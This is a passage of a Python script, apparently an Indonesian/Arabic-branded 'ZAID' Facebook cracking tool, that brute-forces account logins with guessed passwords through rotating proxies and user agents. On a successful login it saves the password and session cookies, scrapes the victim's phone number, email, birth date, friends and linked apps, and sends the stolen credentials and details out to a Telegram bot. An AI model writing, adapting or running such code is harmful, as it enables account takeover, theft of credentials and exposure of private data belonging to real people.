					pwv.append('1122334455')
					pwv.append('1q2w3e4r5t')
					pwv.append('1q2w3e4r5t6y')
					pwv.append('20202020')
					pwv.append('20222022')
					pwv.append('aassddff')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append('112233445566')
					pwv.append('1122334455')
					pwv.append('123412345')
					pwv.append('11223344@@')	
					pwv.append('11223344556677')
					pwv.append('00998877')
					pwv.append('ppooiiuu')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}[=]{k} Been completed {x} <> ')
		time.sleep(2)
		
		exit()		
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s 𓌹 ZAID 𓌺 >> %s/%s >> OK %s >> CP %s > %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip = random.choice(prox)
			proxs = {'http': 'socks4://' + nip}
			tix = time.time()
			ses.headers.update({"Host": 'm.facebook.com', "upgrade-insecure-requests": "1", "user-agent": ua2,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin",
                                "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                                "referer": "https://m.facebook.com/", "accept-encoding": "gzip, deflate br",
                                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'''
-ZAID • فيسبوك سكيور ⚡ • 

-ZAID • Email > {idf}

-ZAID • Pass  > {pw}

• DeCoDe By @uvuxv •
-ZAID • Dev > @uvuxv >< صور صيد
-ZAID • Chn > @SGS5G >< قناتي 	
					'''
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SESI'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'''
-ZAID • فيسبوك شغال⚡ • 

-ZAID • Email > {idf}

-ZAID • Pass  > {pw}

• DeCoDe By @uvuxv •

-ZAID • Dev > @uvuxv >< صور صيد

-ZAID • Chn > @SGS5G >< قناتي 					
					'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title=' NO SESI'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += f'''
-ZAID • فيسبوك شغال⚡ • 

-ZAID • Email > {idf}

-ZAID • Pass  > {pw} 
	
-ZAID • Nom > {nomer}

-ZAID • DATA > {tahun}

• DeCoDe By @uvuxv •

-ZAID • Dev > @uvuxv >< صور صيد

-ZAID • Chn > @SGS5G >< قناتي'''
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
					infoaccount(kuki)

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'''					
   \n{infoakun}					
					'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					infoaccount(kuki)
					
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	pass
def infoaccount(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              > %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              > %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	
	login()
